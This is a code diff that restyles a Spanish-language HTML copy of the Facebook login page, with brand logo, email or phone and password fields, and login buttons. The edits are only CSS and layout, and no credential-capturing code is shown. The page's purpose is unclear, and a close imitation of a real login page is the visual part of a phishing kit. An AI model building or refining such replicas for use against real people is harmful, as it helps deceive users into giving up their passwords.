@@ -2,21 +2,27 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - Iniciar sesión</title>
     <style>
         /* Estilos generales */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(to bottom, #f7f8fc, #ffffff);
             text-align: center;
-            margin: 0;
-            padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            height: 100vh; /* Ocupa toda la pantalla */
+            width: 100vw;  /* Ocupa todo el ancho */
+            overflow: hidden; /* Evita el scroll */
         }
 
         /* Idioma */
@@ -32,11 +38,17 @@
             margin-bottom: 20px;
         }
 
+        /* Contenedor de inputs y botones */
+        .container {
+            width: 100%;
+            max-width: 360px; /* Máximo ancho para pantallas grandes */
+            padding: 0 20px; /* Padding en los lados para centrar en pantallas pequeñas */
+        }
+
         /* Campos de entrada */
         .input-box {
-            width: 92%;
-            max-width: 320px;
-            padding: 12px;
+            width: 100%;
+            padding: 14px;
             margin: 8px 0;
             border: 1px solid #ccd0d5;
             border-radius: 12px;
@@ -47,9 +59,8 @@
 
         /* Botón de inicio de sesión */
         .login-button {
-            width: 92%;
-            max-width: 300px;
-            padding: 12px;
+            width: 100%;
+            padding: 14px;
             background-color: #1877f2;
             color: white;
             border: none;
@@ -77,9 +88,8 @@
 
         /* Botón de crear cuenta */
         .create-account {
-            width: 92%;
-            max-width: 300px;
-            padding: 12px;
+            width: 100%;
+            padding: 14px;
             border: 1px solid #1877f2;
             background-color: white;
             color: #1877f2;
@@ -132,18 +142,21 @@
     <!-- Logo de Facebook -->
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
 
-    <!-- Campos de entrada -->
-    <input type="text" class="input-box" placeholder="Celular o correo electrónico">
-    <input type="password" class="input-box" placeholder="Contraseña">
+    <!-- Contenedor de los elementos -->
+    <div class="container">
+        <!-- Campos de entrada -->
+        <input type="text" class="input-box" placeholder="Celular o correo electrónico">
+        <input type="password" class="input-box" placeholder="Contraseña">
 
-    <!-- Botón de inicio de sesión -->
-    <button class="login-button">Iniciar sesión</button>
+        <!-- Botón de inicio de sesión -->
+        <button class="login-button">Iniciar sesión</button>
 
-    <!-- Enlace de recuperación de contraseña -->
-    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+        <!-- Enlace de recuperación de contraseña -->
+        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
 
-    <!-- Botón de crear cuenta -->
-    <button class="create-account">Crear cuenta nueva</button>
+        <!-- Botón de crear cuenta -->
+        <button class="create-account">Crear cuenta nueva</button>
+    </div>
 
     <!-- Sección de Meta con el icono -->
     <div class="meta-section">
@@ -153,8 +166,8 @@
 
     <!-- Pie de página -->
     <div class="footer">
-        <a href="#">Información</a> 
-        <a href="#">Ayuda</a> 
+        <a href="#">Información</a> |
+        <a href="#">Ayuda</a> |
         <a href="#">Más</a>
     </div>
 
